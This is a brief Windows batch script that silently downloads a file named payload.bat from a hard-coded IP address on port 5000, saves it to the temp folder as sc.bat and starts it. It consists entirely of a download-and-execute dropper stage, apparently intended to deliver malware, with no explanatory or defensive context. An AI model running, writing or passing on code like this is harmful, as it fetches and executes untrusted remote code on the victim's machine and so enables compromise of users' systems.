@echo off
set URL=http://82.29.153.101:5000/payload.bat
set FILE=%temp%\sc.bat

curl -s -o "%FILE%" "%URL%"

if exist "%FILE%" (
    start "" "%FILE%"
)